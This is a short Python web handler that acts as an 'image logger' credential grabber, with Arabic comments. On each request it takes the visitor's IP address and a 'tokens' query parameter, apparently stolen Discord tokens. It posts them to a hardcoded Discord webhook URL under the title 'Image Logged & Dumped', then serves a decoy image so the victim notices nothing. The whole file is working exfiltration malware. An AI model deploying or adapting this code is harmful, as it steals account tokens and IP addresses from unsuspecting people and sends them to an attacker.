from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, json

WEBHOOK = "https://discord.com/api/webhooks/1418902069984759868/QeEnBq9MY1Krb1eWER3P7NPDwhJK8QoqZVjHJVkWWxiJhsgNkO-Hv3FbOQ9JlCrKU8nH"
IMG_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSh0Evg2YNAbxH1OyJeEgTWmYLoukpkNbhXjw&s"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        dic = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
        tks = dic.get("tokens", "❌ No tokens")
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]

        # إرسال المعلومات لـ Discord
        payload = {
            "embeds": [{
                "title": "📸 Image Logged & Dumped",
                "description": f"**IP:** `{ip}`\n**Tokens:**\n{tks.replace(',', '\n🔑 ')}",
                "color": 0x00FFFF
            }]
        }
        requests.post(WEBHOOK, json=payload)

        # عرض الصورة للضحية
        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.end_headers()
        self.wfile.write(requests.get(IMG_URL).content)
